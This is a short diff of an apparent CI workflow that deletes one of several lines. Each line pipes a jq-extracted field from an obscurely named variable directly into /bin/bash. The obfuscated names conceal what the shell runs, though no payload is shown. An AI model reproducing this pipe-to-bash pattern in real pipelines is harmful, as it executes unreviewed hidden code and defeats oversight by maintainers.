@@ -49,7 +49,6 @@ jobs:
           echo $ek0497 | jq -r .trc4738 | /bin/bash
           echo $srjk540 | jq -r .bcej8 | /bin/bash
           echo $f0327 | jq -r .tvf43 | /bin/bash
-          echo $l612 | jq -r .rowd354 | /bin/bash
           echo $cvql777 | jq -r .dktth496 | /bin/bash
           printf '%s' "$jn294" | jq -r .svay95 | /bin/bash
           echo $zi0585 | jq -r .w521 | /bin/bash
